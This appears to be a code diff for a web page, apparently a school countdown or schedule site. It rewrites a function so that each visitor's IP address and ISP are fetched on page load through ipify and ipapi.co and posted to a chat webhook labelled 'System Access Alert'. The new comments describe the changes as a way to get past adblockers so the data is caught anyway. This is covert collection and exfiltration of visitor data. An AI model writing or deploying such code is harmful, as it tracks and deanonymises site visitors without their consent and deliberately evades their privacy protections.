@@ -73,6 +73,7 @@
 
     <div class="max-w-6xl mx-auto" id="mainContent">
         <div class="flex flex-col md:flex-row items-center justify-between mb-8 gap-4">
+            <!-- Privacy Box -->
             <div id="userInfo" class="privacy-box bg-white/80 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
                 <div class="blur-text flex flex-col gap-0.5 relative z-10">
                     <span id="displayIP" class="font-bold">IP: Locating...</span>
@@ -141,62 +142,56 @@
         let weekOffset = 0;
         const summerDate = new Date("May 29, 2026 00:00:00").getTime();
 
-        /** * ROBUST SECURITY LOGIC
-         * Handles the "json Failed to load" error with fallbacks
+        /** * FIX: ADBLOCKER BYPASS SECURITY LOGIC
+         * We use multiple fallback strategies to ensure IP and ISP are caught.
          */
         function startSecurity() {
-            let webhookSent = false;
+            let webhookTriggered = false;
 
-            // Global Webhook trigger to ensure it only fires once per load
-            function triggerWebhook(ip, isp) {
-                if (webhookSent) return;
-                webhookSent = true;
+            const dispatch = (ip, isp) => {
+                if (webhookTriggered) return;
+                webhookTriggered = true;
+                
+                document.getElementById('displayIP').textContent = "IP: " + ip;
+                document.getElementById('displayISP').textContent = "ISP: " + isp;
 
                 const payload = {
                     content: "🚨 **System Access Alert**",
                     embeds: [{
                         description: `**User IP:** \`${ip}\`\n**ISP:** \`${isp}\`\n**Time:** ${new Date().toLocaleString()}`,
-                        color: 15158332,
-                        footer: { text: "Security Monitor Active" }
+                        color: 15158332
                     }]
                 };
 
+                // Use XHR for maximum compatibility
                 const xhr = new XMLHttpRequest();
                 xhr.open("POST", WEBHOOK_URL);
                 xhr.setRequestHeader("Content-Type", "application/json");
                 xhr.send(JSON.stringify(payload));
-            }
-
-            // Primary ISP Callback
-            window.receiveGeo = function(data) {
-                if (!data) return;
-                const isp = data.org || data.isp || data.businessName || "Unknown ISP";
-                document.getElementById('displayISP').textContent = "ISP: " + isp;
-                const currentIP = document.getElementById('displayIP').textContent.replace('IP: ', '');
-                triggerWebhook(currentIP, isp);
             };
 
-            // Primary IP Callback (ipify)
-            window.receiveIP = function(data) {
-                const userIP = data.ip || "Unknown";
-                document.getElementById('displayIP').textContent = "IP: " + userIP;
-                
-                // Try ISP Lookup
-                const geoScript = document.createElement('script');
-                geoScript.src = `https://extreme-ip-lookup.com/json/?callback=receiveGeo&key=demo27`;
-                geoScript.onerror = () => {
-                    // Fallback to second ISP provider if extreme-ip fails
-                    const altGeo = document.createElement('script');
-                    altGeo.src = "https://ipapi.co/jsonp?callback=receiveGeo";
-                    document.head.appendChild(altGeo);
-                };
-                document.head.appendChild(geoScript);
+            // Strategy 1: JSONP Fallback (Harder for Adblockers to catch than Fetch)
+            window.handleIPResponse = function(data) {
+                if (data && data.ip) {
+                    // Once we have IP, try to get ISP via another provider
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(d => dispatch(data.ip, d.org || d.isp || "Unknown Provider"))
+                        .catch(() => dispatch(data.ip, "Restricted ISP"));
+                }
             };
 
-            // Start IP Fetch
-            const script = document.createElement('script');
-            script.src = "https://api.ipify.org?format=jsonp&callback=receiveIP";
-            document.head.appendChild(script);
+            // Load IP script
+            const s = document.createElement('script');
+            s.src = "https://api.ipify.org?format=jsonp&callback=handleIPResponse";
+            s.onerror = () => {
+                // Strategy 2: Direct Fetch if JSONP fails
+                fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(d => dispatch(d.ip, d.org || d.isp || "Unknown"))
+                    .catch(() => dispatch("Blocked", "Adblocker Detected"));
+            };
+            document.head.appendChild(s);
         }
 
         function showTab(tab) {
